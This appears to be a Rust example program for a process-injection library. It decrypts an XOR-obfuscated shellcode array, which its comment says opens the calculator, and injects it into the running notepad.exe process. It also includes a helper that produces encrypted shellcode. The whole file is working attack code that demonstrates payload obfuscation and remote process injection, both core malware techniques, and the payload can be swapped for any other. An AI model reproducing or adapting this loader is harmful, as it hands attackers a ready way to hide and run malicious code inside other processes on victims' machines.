use needle::{
    cypher::{PayloadCypher, XorCypher, XorCypherExt},
    find_process, inject, Shellcode,
};

const SHELL_CODE: &[u8] = &[
    0xbe, 0xa, 0xc1, 0xa6, 0xb2, 0xaa, 0x82, 0x42, 0x42, 0x42, 0x3, 0x13, 0x3, 0x12, 0x10, 0x13,
    0x14, 0xa, 0x73, 0x90, 0x27, 0xa, 0xc9, 0x10, 0x22, 0xa, 0xc9, 0x10, 0x5a, 0xa, 0xc9, 0x10,
    0x62, 0xa, 0xc9, 0x30, 0x12, 0xa, 0x4d, 0xf5, 0x8, 0x8, 0xf, 0x73, 0x8b, 0xa, 0x73, 0x82, 0xee,
    0x7e, 0x23, 0x3e, 0x40, 0x6e, 0x62, 0x3, 0x83, 0x8b, 0x4f, 0x3, 0x43, 0x83, 0xa0, 0xaf, 0x10,
    0x3, 0x13, 0xa, 0xc9, 0x10, 0x62, 0xc9, 0x0, 0x7e, 0xa, 0x43, 0x92, 0xc9, 0xc2, 0xca, 0x42,
    0x42, 0x42, 0xa, 0xc7, 0x82, 0x36, 0x25, 0xa, 0x43, 0x92, 0x12, 0xc9, 0xa, 0x5a, 0x6, 0xc9,
    0x2, 0x62, 0xb, 0x43, 0x92, 0xa1, 0x14, 0xa, 0xbd, 0x8b, 0x3, 0xc9, 0x76, 0xca, 0xa, 0x43,
    0x94, 0xf, 0x73, 0x8b, 0xa, 0x73, 0x82, 0xee, 0x3, 0x83, 0x8b, 0x4f, 0x3, 0x43, 0x83, 0x7a,
    0xa2, 0x37, 0xb3, 0xe, 0x41, 0xe, 0x66, 0x4a, 0x7, 0x7b, 0x93, 0x37, 0x9a, 0x1a, 0x6, 0xc9,
    0x2, 0x66, 0xb, 0x43, 0x92, 0x24, 0x3, 0xc9, 0x4e, 0xa, 0x6, 0xc9, 0x2, 0x5e, 0xb, 0x43, 0x92,
    0x3, 0xc9, 0x46, 0xca, 0xa, 0x43, 0x92, 0x3, 0x1a, 0x3, 0x1a, 0x1c, 0x1b, 0x18, 0x3, 0x1a, 0x3,
    0x1b, 0x3, 0x18, 0xa, 0xc1, 0xae, 0x62, 0x3, 0x10, 0xbd, 0xa2, 0x1a, 0x3, 0x1b, 0x18, 0xa,
    0xc9, 0x50, 0xab, 0x15, 0xbd, 0xbd, 0xbd, 0x1f, 0xa, 0xf8, 0x43, 0x42, 0x42, 0x42, 0x42, 0x42,
    0x42, 0x42, 0xa, 0xcf, 0xcf, 0x43, 0x43, 0x42, 0x42, 0x3, 0xf8, 0x73, 0xc9, 0x2d, 0xc5, 0xbd,
    0x97, 0xf9, 0xa2, 0x5f, 0x68, 0x48, 0x3, 0xf8, 0xe4, 0xd7, 0xff, 0xdf, 0xbd, 0x97, 0xa, 0xc1,
    0x86, 0x6a, 0x7e, 0x44, 0x3e, 0x48, 0xc2, 0xb9, 0xa2, 0x37, 0x47, 0xf9, 0x5, 0x51, 0x30, 0x2d,
    0x28, 0x42, 0x1b, 0x3, 0xcb, 0x98, 0xbd, 0x97, 0x21, 0x23, 0x2e, 0x21, 0x6c, 0x27, 0x3a, 0x27,
    0x42,
]; // Xor encrypted shellcode: Open calculator (Can be obtained using XorCypher::<Shellcode>::encrypt(SHELL_CODE, KEY).shellcode();)

const KEY: u8 = 0x42;

fn main() {
    let payload = XorCypher::from(SHELL_CODE.to_vec()).decrypt(&KEY);

    let process = find_process("notepad.exe").expect("Target process not found");
    if let Err(e) = inject(process, payload) {
        println!("Could not inject payload: {}", e);
    }
}

#[allow(dead_code)]
fn generate_payload(shellcode: Shellcode) {
    let payload = shellcode.into_raw().xor_encrypt(&KEY);
    println!("Encrypted shellcode: {:#04x?}", payload);
}
